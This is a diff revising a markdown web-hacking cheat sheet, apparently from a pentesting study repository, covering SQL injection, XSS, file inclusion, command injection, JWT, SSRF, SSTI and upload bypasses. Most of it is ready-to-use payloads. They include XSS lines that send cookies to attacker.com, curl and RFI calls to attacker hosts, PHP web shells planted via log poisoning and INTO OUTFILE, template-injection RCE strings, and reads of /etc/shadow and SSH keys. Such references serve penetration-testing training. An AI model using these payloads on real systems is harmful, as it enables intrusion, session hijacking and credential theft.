@@ -1,97 +1,106 @@
 ﻿# 🕸️ Web Hacking & Exploitation
 
-> **Focus:** Analyzing and exploiting web application vulnerabilities following OWASP methodology.
+> **Focus:** Exploiting web application vulnerabilities. This is the largest attack surface in modern pentesting.
 
 ---
 
-## 🌐 HTTP Fundamentals
+## 📋 Web Pentest Methodology
 
-### Request Methods
-| Method | Purpose | Security Context |
-|--------|---------|-----------------|
-| **GET** | Retrieve data | Parameters visible in URL/logs |
-| **POST** | Submit data | Data in body (logins, uploads) |
-| **PUT** | Create/Replace resource | Web shell upload if misconfigured |
-| **DELETE** | Remove resource | IDOR / access control testing |
-| **PATCH** | Partial update | Parameter tampering |
-| **OPTIONS** | Show allowed methods | Recon (CORS, allowed verbs) |
+```
+1. Recon & Mapping
+   ├── Technology identification (Wappalyzer, whatweb)
+   ├── Directory/file discovery (ffuf, gobuster)
+   ├── Parameter discovery (Arjun, ParamSpider)
+   └── Sitemap, robots.txt, .git, .env
 
-### Important Headers for Pentesting
-| Header | Offensive Use |
-|--------|--------------|
-| `Cookie` | Session hijacking, token manipulation |
-| `Authorization` | Bearer token theft, JWT attacks |
-| `X-Forwarded-For` | IP spoofing to bypass restrictions |
-| `Referer` | Bypass referer-based access controls |
-| `Content-Type` | Switch to XML for XXE, JSON for injection |
-| `Host` | Virtual host routing, SSRF |
+2. Authentication Testing
+   ├── Default credentials
+   ├── Brute-force (Hydra, Burp Intruder)
+   ├── Registration flaws
+   └── Password reset flaws
 
-### HTTP Status Codes (Pentest Relevant)
-| Code | Meaning | Action |
-|------|---------|--------|
-| 200 | OK | Content accessible |
-| 301/302 | Redirect | Follow, check for open redirect |
-| 401 | Unauthorized | Needs auth (brute-force target) |
-| 403 | Forbidden | Exists but blocked (try bypass) |
-| 405 | Method Not Allowed | Try other HTTP methods |
-| 500 | Server Error | Possible injection point |
+3. Authorization Testing
+   ├── IDOR (change IDs in requests)
+   ├── Privilege escalation (user → admin)
+   ├── Forced browsing (access admin pages directly)
+   └── HTTP method tampering
+
+4. Injection Testing
+   ├── SQL Injection
+   ├── Command Injection
+   ├── SSTI (Template Injection)
+   ├── XSS (Cross-Site Scripting)
+   └── XXE (XML External Entity)
+
+5. File-Based Attacks
+   ├── LFI / RFI (File Inclusion)
+   ├── File Upload bypass
+   └── Path Traversal
+
+6. Logic & Session Attacks
+   ├── Session fixation/hijacking
+   ├── CSRF
+   ├── JWT manipulation
+   └── Business logic flaws
+```
 
 ---
 
 ## 💉 SQL Injection (SQLi)
 
-### Detection Payloads
+### Detection
 ```
-'
-"
 ' OR 1=1--
+" OR 1=1--
 ' OR 1=1#
-" OR ""="
+') OR ('1'='1
 ' UNION SELECT NULL--
-1' AND '1'='1
-1' AND '1'='2
+' AND 1=2--
 ```
 
-### Types
-| Type | Description | Detection |
-|------|-------------|-----------|
-| Error-based | DB errors reveal data | Visible error messages |
-| UNION-based | Combine queries to extract data | Append UNION SELECT |
-| Blind (Boolean) | True/False responses differ | Response length changes |
-| Blind (Time) | Response time differs | SLEEP causes delay |
-| Out-of-Band | Data sent to external server | DNS/HTTP callbacks |
-
-### UNION-Based Methodology
+### UNION-Based Exploitation
 ```sql
--- Step 1: Find number of columns
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--    (error = previous number is correct)
+-- Find number of columns
+' ORDER BY 1--    (increment until error)
 
--- Step 2: Find displayable columns
+-- Identify displayable columns
 ' UNION SELECT 1,2,3--
-' UNION SELECT NULL,NULL,NULL--
 
--- Step 3: Extract database info
-' UNION SELECT version(),database(),user()--
-' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+-- Extract database names
+' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--
+
+-- Extract tables
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='dbname'--
+
+-- Extract columns
 ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
 
--- Step 4: Dump data
+-- Extract data
 ' UNION SELECT username,password,NULL FROM users--
+
+-- Read files (MySQL)
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
+
+-- Write files (MySQL)
+' UNION SELECT "webshell content",NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--
 ```
 
-### Blind Boolean Example
+### Blind SQLi (Boolean)
 ```sql
+-- Test true/false
+' AND 1=1--    (normal response)
+' AND 1=2--    (different response)
+
+-- Extract data char by char
 ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
-' AND (SELECT LENGTH(password) FROM users LIMIT 1)=32--
+' AND (SELECT LENGTH(password) FROM users LIMIT 1)>10--
 ```
 
-### Blind Time-Based
+### Blind SQLi (Time-Based)
 ```sql
 -- MySQL
 ' AND SLEEP(5)--
-' AND IF(1=1,SLEEP(5),0)--
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
 
 -- MSSQL
 '; WAITFOR DELAY '0:0:5'--
@@ -100,22 +109,25 @@
 '; SELECT pg_sleep(5)--
 ```
 
-### SQLMap Quick Reference
+### SQLMap Cheat Sheet
 ```bash
-# GET parameter
-sqlmap -u "http://target/page?id=1" --dbs
+# Basic GET
+sqlmap -u "http://target/page?id=1" --dbs --batch
 
-# POST (from Burp saved request)
+# POST request from Burp
 sqlmap -r request.txt --batch --dbs
 
-# Dump table
-sqlmap -u "http://target/page?id=1" -D dbname -T users --dump
+# Dump specific table
+sqlmap -u "URL" -D dbname -T users --dump
 
-# OS shell
-sqlmap -u "http://target/page?id=1" --os-shell
+# Get OS shell
+sqlmap -u "URL" --os-shell
 
 # Bypass WAF
-sqlmap -u "http://target/page?id=1" --tamper=space2comment --random-agent
+sqlmap -u "URL" --tamper=space2comment,between --random-agent
+
+# Specify injection point
+sqlmap -u "URL" -p "parameter" --technique=BT
 ```
 
 ---
@@ -125,129 +137,219 @@ sqlmap -u "http://target/page?id=1" --tamper=space2comment --random-agent
 ### Types
 | Type | Where it executes | Persistence |
 |------|-------------------|-------------|
-| Reflected | URL parameter reflected in page | None (requires victim click) |
-| Stored | Saved in DB, shown to all users | Persistent |
-| DOM-based | Client-side JS manipulation | None |
+| Reflected | URL parameter → response | None (one-time) |
+| Stored | Saved in DB → shown to users | Persistent |
+| DOM-based | Client-side JS manipulation | Depends |
 
-### Test Payloads
+### Test Payloads (start simple, escalate)
 ```html
+<!-- Basic detection -->
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
+
+<!-- If tags are filtered -->
 "><script>alert(1)</script>
-'><img src=x onerror=alert(1)>
+'><script>alert(1)</script>
 javascript:alert(1)
+
+<!-- If script is filtered -->
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
 <body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+
+<!-- If event handlers filtered -->
+<script>alert`1`</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+<!-- Cookie stealing -->
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
 ```
 
-### Filter Bypass Techniques
+### XSS Filter Bypass
 ```html
 <!-- Case variation -->
 <ScRiPt>alert(1)</ScRiPt>
 
-<!-- Event handlers -->
-<img src=x onerror=alert(1)>
-<svg/onload=alert(1)>
-<details open ontoggle=alert(1)>
-
 <!-- Encoding -->
-<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
-
-<!-- Without parentheses -->
-<img src=x onerror=alert`1`>
+<script>eval(atob('YWxlcnQoMSk='))</script>
 
 <!-- Double encoding -->
 %253Cscript%253Ealert(1)%253C/script%253E
-```
 
-### Cookie Stealing (Stored XSS)
-```html
-<script>document.location='http://attacker/steal?c='+document.cookie</script>
-<img src=x onerror="fetch('http://attacker/steal?c='+document.cookie)">
+<!-- Null bytes -->
+<scr%00ipt>alert(1)</scr%00ipt>
 ```
 
 ---
 
-## 📁 File Inclusion (LFI / RFI)
+## 📂 File Inclusion (LFI / RFI)
 
-### Local File Inclusion (LFI)
+### LFI Detection
 ```
-# Basic
-?page=../../../../etc/passwd
-?file=....//....//....//etc/passwd
-
-# Null byte (PHP < 5.3)
-?page=../../../../etc/passwd%00
-
-# PHP wrappers
-?page=php://filter/convert.base64-encode/resource=config.php
-?page=php://input  (POST data as code)
-?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
-
-# Log poisoning (inject into User-Agent, then include log)
-?page=/var/log/apache2/access.log
-?page=/var/log/nginx/access.log
-?page=/proc/self/environ
+http://target.com/page?file=../../../../etc/passwd
+http://target.com/page?file=....//....//....//etc/passwd
+http://target.com/page?file=/etc/passwd%00    (null byte, PHP < 5.3)
+http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php
 ```
 
-### Common Files to Read
+### LFI Interesting Files
 ```
 # Linux
 /etc/passwd
 /etc/shadow (if readable)
 /etc/hosts
-/home/user/.ssh/id_rsa
-/var/log/apache2/access.log
 /proc/self/environ
+/var/log/apache2/access.log
+/var/log/auth.log
+~/.ssh/id_rsa
+/home/<user>/.bash_history
 
 # Windows
 C:\Windows\System32\drivers\etc\hosts
 C:\Windows\win.ini
 C:\inetpub\wwwroot\web.config
-C:\Users\Administrator\.ssh\id_rsa
+C:\Users\<user>\.ssh\id_rsa
 ```
 
-### Remote File Inclusion (RFI)
+### LFI to RCE
+```bash
+# Log Poisoning (Apache)
+# 1. Inject into User-Agent:
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
+# 2. Include the log:
+http://target.com/page?file=/var/log/apache2/access.log&cmd=whoami
+
+# PHP Wrappers
+# Read source code (base64)
+php://filter/convert.base64-encode/resource=config.php
+
+# Execute code
+php://input   (POST body contains PHP code)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+
+# Expect wrapper
+expect://whoami
 ```
-?page=http://attacker.com/shell.txt
-?page=\\attacker.com\share\shell.php
+
+### RFI (Remote File Inclusion)
 ```
-
----
-
-## 📤 File Upload Attacks
-
-### Bypass Techniques
-| Filter | Bypass |
-|--------|--------|
-| Extension blacklist | .php5, .phtml, .phar, .PhP, .php.jpg |
-| Content-Type check | Change header to image/jpeg |
-| Magic bytes | Add GIF89a; before payload |
-| Double extension | shell.php.jpg, shell.jpg.php |
-| Null byte | shell.php%00.jpg |
-| .htaccess upload | Upload .htaccess to make .jpg execute as PHP |
-
-### Methodology
-```
-1. Upload normal file (test functionality)
-2. Upload with changed extension (.php5, .phtml)
-3. Upload with double extension (shell.php.jpg)
-4. Change Content-Type header in Burp
-5. Add magic bytes (GIF89a;) before payload
-6. Try uploading .htaccess first
-7. Try case variations (.pHp, .PHP)
+http://target.com/page?file=http://attacker.com/shell.txt
+http://target.com/page?file=\\attacker.com\share\shell.php
 ```
 
 ---
 
-## 🌐 Server-Side Request Forgery (SSRF)
+## 💻 Command Injection
+
+### Detection
+```bash
+# Operators to test
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+$(whoami)
+`whoami`
+```
+
+### Blind Command Injection
+```bash
+# Time-based
+; sleep 5
+| sleep 5
+
+# Out-of-band (DNS)
+; nslookup attacker.com
+| curl http://attacker.com/$(whoami)
+; ping -c 1 attacker.com
+```
+
+### Bypass Filters
+```bash
+# Space bypass
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+X=$'cat\x20/etc/passwd'&&$X
+
+# Keyword bypass
+c'a't /etc/passwd
+c"a"t /etc/passwd
+/bin/c?t /etc/passwd
+cat /e?c/p?sswd
+
+# Newline bypass
+%0awhoami
+```
+
+---
+
+## 🔐 Authentication Bypass
+
+### Common Techniques
+```
+# Default credentials (always try first)
+admin:admin, admin:password, root:root, test:test
+
+# SQL injection in login
+Username: admin' OR 1=1--
+Password: anything
+
+# Response manipulation (Burp)
+Change "authenticated": false → true
+Change HTTP 302 redirect to 200
+
+# Password reset flaws
+- Predictable tokens
+- Host header injection
+- Email parameter pollution
+
+# 2FA Bypass
+- Skip the 2FA page (go directly to /dashboard)
+- Brute-force short codes
+- Reuse valid codes
+- Response manipulation
+```
+
+---
+
+## 🎫 JWT Attacks
+
+### Structure: Header.Payload.Signature
+
+### Common Attacks
+```bash
+# None algorithm attack
+# Change header to: {"alg":"none","typ":"JWT"}
+# Remove signature (keep trailing dot)
+
+# Key confusion (RS256 → HS256)
+# Sign with the public key using HS256
+
+# Brute-force weak secret
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
+
+# Tools
+jwt_tool <token> -T    # Tamper mode
+jwt_tool <token> -C -d rockyou.txt   # Crack secret
+```
+
+---
+
+## 🌐 SSRF (Server-Side Request Forgery)
 
 ### Basic Payloads
 ```
 # Access internal services
 http://127.0.0.1:80
 http://localhost:8080/admin
-http://0.0.0.0:22
+http://[::1]:80
 
 # Cloud metadata (AWS)
 http://169.254.169.254/latest/meta-data/
@@ -256,76 +358,92 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 # Cloud metadata (Azure)
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
 
-# Cloud metadata (GCP)
-http://metadata.google.internal/computeMetadata/v1/
+# Internal network scanning
+http://192.168.1.1:22
+http://10.0.0.1:3306
 ```
 
 ### Bypass Filters
 ```
-# IP alternatives for 127.0.0.1
-http://2130706433 (decimal)
-http://0x7f000001 (hex)
-http://017700000001 (octal)
-http://127.1
-http://[::1]
+# Decimal IP
+http://2130706433  (= 127.0.0.1)
+
+# Hex IP
+http://0x7f000001
+
+# Octal
+http://0177.0.0.1
 
 # DNS rebinding
-Use a domain that resolves to 127.0.0.1
+http://spoofed.burpcollaborator.net
 
 # URL encoding
-http://%31%32%37%2e%30%2e%30%2e%31
+http://127.0.0.1%2523@attacker.com
+
+# Redirect bypass
+http://attacker.com/redirect?url=http://127.0.0.1
 ```
 
 ---
 
-## 🔐 Authentication Attacks
+## 📝 SSTI (Server-Side Template Injection)
 
-### Default Credentials (always try first)
+### Detection
 ```
-admin:admin
-admin:password
-root:root
-root:toor
-administrator:administrator
-guest:guest
-test:test
+# Test with math expressions
+{{7*7}}     → 49 means Jinja2/Twig
+${7*7}      → 49 means Freemarker/Velocity
+#{7*7}      → 49 means Thymeleaf
+<%= 7*7 %>  → 49 means ERB (Ruby)
 ```
 
-### JWT Attacks
-```
-# None algorithm
-Change header to {"alg":"none"} and remove signature
+### Exploitation (Jinja2 / Python)
+```python
+# Read files
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
 
-# Key confusion (RS256 to HS256)
-Change alg from RS256 to HS256, sign with public key
+# RCE
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
 
-# Brute force secret
-hashcat -m 16500 jwt.txt -a 3 -w 2 /usr/share/wordlists/rockyou.txt
-
-# Tools: jwt_tool, jwt.io
+# Simpler RCE payloads
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
 ```
 
-### 2FA Bypass Techniques
+### Exploitation (Twig / PHP)
 ```
-- Response manipulation (change "success":false to true)
-- Brute force the code (if no rate limiting)
-- Reuse old valid codes
-- Skip the 2FA step (go directly to post-auth URL)
-- Use backup codes
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+```
+
+---
+
+## 📁 File Upload Attacks
+
+### Bypass Techniques
+```
+# Extension bypass
+shell.php → shell.php5, shell.phtml, shell.phar
+shell.php → shell.php.jpg (double extension)
+shell.php → shell.php%00.jpg (null byte)
+shell.php → shell.PHP (case)
+shell.php → shell.php. (trailing dot)
+shell.php → shell.php::$DATA (Windows ADS)
+
+# Content-Type bypass
+Change Content-Type to: image/jpeg, image/png
+
+# Magic bytes bypass
+Add GIF header: GIF89a; before PHP code
+Add PNG header bytes before code
+
+# .htaccess upload
+Upload .htaccess with: AddType application/x-httpd-php .jpg
+Then upload shell.jpg with PHP code
 ```
 
 ---
 
 ## 🔗 Associated Tools
-* [Burp Suite](../../TOOLS/burpsuite.md) - Intercepting proxy for all web testing
-* [SQLMap](../../TOOLS/sqlmap.md) - SQL injection automation
-* [Gobuster](../../TOOLS/gobuster.md) - Directory and file discovery
-* [Hydra](../../TOOLS/hydra.md) - Login brute-forcing
-
----
-
-## 📚 Resources
-- PortSwigger Web Security Academy (free labs)
-- OWASP Testing Guide
-- HackTricks Web section
-- PayloadsAllTheThings (GitHub)
+- [Burp Suite](../../TOOLS/burpsuite.md) - Intercepting proxy
+- [SQLMap](../../TOOLS/sqlmap.md) - SQL injection automation
+- [Gobuster](../../TOOLS/gobuster.md) - Content discovery
+- [Hydra](../../TOOLS/hydra.md) - Login brute-force
